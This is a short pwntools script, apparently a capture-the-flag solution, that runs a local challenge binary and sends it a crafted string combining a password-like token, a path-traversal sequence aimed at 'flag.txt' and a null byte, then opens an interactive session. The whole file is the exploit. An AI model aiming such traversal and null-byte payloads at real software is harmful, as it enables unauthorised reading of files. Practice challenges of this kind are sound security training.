from pwn import *
p=process("./4-23")
p.recv();
p.sendline("kaiokenx20"+"0xdead"+"././././././././././././././flag.txt"+"\x00")
print p.recv()
p.sendline("8");

p.interactive();
